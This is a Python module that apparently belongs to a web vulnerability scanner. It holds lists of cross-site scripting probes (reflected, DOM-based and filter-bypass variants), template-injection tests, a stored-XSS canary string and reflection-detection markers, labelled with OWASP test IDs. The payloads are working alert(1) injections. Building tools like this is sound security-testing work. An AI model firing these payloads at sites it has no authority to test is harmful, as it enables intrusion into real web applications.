"""Cross-Site Scripting (XSS) payload library (OWASP WSTG-INPV-01/02)."""

# Reflected XSS probes
REFLECTED = [
    '<script>alert(1)</script>',
    '<img src=x onerror=alert(1)>',
    '<svg onload=alert(1)>',
    '"><script>alert(1)</script>',
    "'-alert(1)-'",
    '<body onload=alert(1)>',
    '<iframe src="javascript:alert(1)">',
    '{{7*7}}',  # Template injection probe
    '${7*7}',  # Template injection probe
    '<details open ontoggle=alert(1)>',
    '<marquee onstart=alert(1)>',
    '<input onfocus=alert(1) autofocus>',
    '"><img src=x onerror=alert(1)>',
    "javascript:alert(1)//",
]

# DOM-based XSS
DOM_BASED = [
    '#<script>alert(1)</script>',
    'javascript:alert(document.domain)',
    'data:text/html,<script>alert(1)</script>',
    '"><svg/onload=alert(1)>',
    '#"><img src=x onerror=alert(1)>',
]

# Filter bypass payloads
FILTER_BYPASS = [
    '<scr<script>ipt>alert(1)</scr</script>ipt>',
    '<ScRiPt>alert(1)</ScRiPt>',
    '<script>alert(String.fromCharCode(88,83,83))</script>',
    '\\x3cscript\\x3ealert(1)\\x3c/script\\x3e',
    '<img src=x onerror="&#97;lert(1)">',
    '<svg/onload=alert(1)>',
    '<<script>alert(1)//',
    '<script>alert`1`</script>',
    '<img src=1 onerror=alert(1)//',
    '%3Cscript%3Ealert(1)%3C/script%3E',
]

# Stored XSS (safe canary markers for detection)
STORED_CANARY = "vtstr1ke{xss_canary_%RAND%}"

ALL_PAYLOADS = REFLECTED + DOM_BASED + FILTER_BYPASS

# Detection: look for unescaped reflection in response
REFLECTION_MARKERS = [
    "<script>alert(1)</script>",
    "onerror=alert(1)",
    "onload=alert(1)",
    "javascript:alert",
]
